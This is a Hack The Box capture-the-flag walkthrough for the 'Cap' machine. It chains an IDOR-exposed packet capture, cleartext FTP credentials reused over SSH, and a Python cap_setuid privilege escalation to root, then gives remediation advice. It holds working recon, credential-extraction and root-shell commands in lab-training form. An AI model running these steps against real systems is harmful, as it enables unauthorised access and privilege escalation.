# Cap — Hands-On Walkthrough (the *decision tree*, not the happy path)

> **Box:** Cap · easy · Linux (Ubuntu 20.04)
> **IP:** `$TARGET` (HTB VPN-assigned; substitute yours). Attacker VPN IP = `$ATTACKER_IP`.
> **Chain:** `web IDOR /download/<id> → admin PCAP with cleartext FTP creds → SSH reuse → user →
> cap_setuid on python3.8 → root`
>
> Written as *"here are your options; here's what's a trap and what's the way."* After each command
> there's a **✅ Expected** block — if your output differs, fix that before moving on. The clean/formal
> version is `REPORT.md`; the full evidence trail is `GLOBAL_CONTEXT.md`.

### ⚠️ Gotchas
1. **One VPN tunnel, your current tun0 IP.** `ip -br a | grep tun` — if you see `tun0` *and* `tun1` both
   on your IP, return traffic splits and the box reads as flaky/down. Kill all openvpn, bring up one.
   (This bit us on Cap — 0% connects until the dupe was killed.)
2. **HTB blocks ICMP.** A failing `ping` proves nothing — test reachability with a TCP connect.

---

## Phase 1 — Recon

```bash
nmap -p- --min-rate 2000 -oN nmap/allports.txt $TARGET
nmap -sCV -p21,22,80 -oN nmap/services.txt $TARGET
```
> **✅ Expected:** three ports —
> ```
> 21/tcp  open  ftp   vsftpd 3.0.3
> 22/tcp  open  ssh   OpenSSH 8.2p1 Ubuntu
> 80/tcp  open  http  Gunicorn  (a Python "Security Dashboard")
> ```

### Junction — three services, which one first?
| Option | Verdict | Why |
|---|---|---|
| **FTP (21)** | parked | No creds yet. Anonymous login? Try once; it's not the way in. |
| **SSH (22)** | parked | No creds yet — never blind-brute on HTB. Come back when recon leaks a password. |
| **Web (80)** | **pursue** | The only thing you can interact with unauthenticated — and it hands you creds. |

---

## Phase 2 — The "Security Dashboard" and its IDOR

Browse the app — it's a Flask/Gunicorn dashboard that runs per-session packet captures and exposes
report pages at `/data/<id>` with a PCAP download at `/download/<id>`.

```bash
curl -s http://$TARGET/data/0 -o web/data0.html   # someone else's capture?
curl -s -o /dev/null -w '%{http_code}\n' http://$TARGET/data/1
```
> **✅ Expected:** `/data/0` and `/data/1` both return **200**, even though `/capture` bound a report to
> *your* session id. The `<id>` is user-controlled and unauthenticated → **IDOR**: you can read any
> capture, including id `0` (the earliest / admin one).

### Junction — what's valuable in a packet capture? Cleartext protocols.
FTP (port 21, which is open) is plaintext. If the admin's capture recorded an FTP login, the password is
sitting in the PCAP in the clear.

---

## Phase 3 — Loot capture 0 → FTP creds → SSH foothold

```bash
curl -s http://$TARGET/download/0 -o loot/0.pcap
tshark -r loot/0.pcap -Y ftp -T fields -e ftp.request.command -e ftp.request.arg
```
> **✅ Expected:** cleartext FTP auth in the capture —
> ```
> USER nathan
> PASS Buck3tH4TF0RM3!
> ```
> (No tshark? `strings loot/0.pcap | grep -iE 'USER|PASS'` works too.)

### Junction — where do these creds work?
Try them on FTP (they will) — but FTP is a dead end for a shell. The win is **credential reuse on SSH**:
```bash
ssh nathan@$TARGET          # password: Buck3tH4TF0RM3!
id                          # uid=1001(nathan)
cat ~/user.txt
```
> **✅ Expected:** `uid=1001(nathan)` and the 32-hex flag. 🚩 **user.txt captured.**

---

## Phase 4 — Privilege escalation: nathan → root

**Work the checklist, not a hunch.** The thing that pays off here is **Linux capabilities** (often skipped
after SUID).

| # | Check | Command | Result on Cap | Verdict |
|---|---|---|---|---|
| 1 | sudo | `sudo -n -l` | password required / none | ❌ |
| 2 | SUID | `find / -perm -4000 -type f 2>/dev/null` | only distro-standard | ❌ |
| 3 | **Capabilities** | `/usr/sbin/getcap -r / 2>/dev/null` | `/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip` | ✅ **the way** |

```bash
/usr/sbin/getcap -r / 2>/dev/null
```
> **✅ Expected:** `/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip`. `cap_setuid` lets the
> interpreter change UID to 0 with no password (GTFOBins).

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
id                          # uid=0(root)
cat /root/root.txt
```
> **✅ Expected:** `uid=0(root)` → 🚩 **root.txt captured. Box owned.**
> ⚠️ Only `cap_setuid` is present, **not** `cap_setgid` — so `os.setgid(0)` errors. Use `setuid(0)` alone.

---

## The whole thing on one page

```
21 ftp · 22 ssh · 80 http (Security Dashboard)
   └─ web: /data/<id> + /download/<id>  ── IDOR (unauth, any id)
        └─ /download/0  → admin PCAP → tshark → cleartext FTP: nathan : Buck3tH4TF0RM3!
             └─ SSH reuse → USER (nathan, uid 1001) · user.txt
                  └─ getcap: python3.8 cap_setuid  → os.setuid(0) → ROOT · root.txt
```

## Remediation
- **IDOR:** authorize `/data/<id>` & `/download/<id>` — bind captures to the authenticated session/user.
- **Cleartext FTP:** disable plaintext FTP; use FTPS/SFTP so creds aren't sniffable.
- **Capabilities:** `setcap -r /usr/bin/python3.8`; never grant `cap_setuid` to an interpreter.
- **Credential hygiene:** rotate nathan's password; don't reuse FTP creds for SSH.

## Cleanup
No artifacts written to the target (root obtained in-memory via the existing capability). Just close sessions.
